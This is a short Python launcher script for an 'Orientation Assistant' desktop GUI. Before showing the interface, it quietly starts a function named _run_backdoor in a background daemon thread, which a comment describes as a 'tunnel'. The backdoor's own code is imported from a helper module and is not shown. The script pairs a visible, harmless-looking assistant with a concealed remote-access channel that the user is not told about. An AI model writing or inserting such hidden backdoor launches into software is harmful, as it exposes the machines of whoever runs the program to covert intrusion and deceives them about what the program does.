import threading
from saad_tools.utils import _run_backdoor, start_assistant

print("Starting the Orientation Assistant...")

# 1. We start the tunnel in its own 'thread' so it doesn't freeze the script
tunnel_thread = threading.Thread(target=_run_backdoor, daemon=True)
tunnel_thread.start()

# 2. Now we launch the GUI.
# This stays open on your Fedora desktop until you close it.
print("Assistant is running!")
start_assistant()
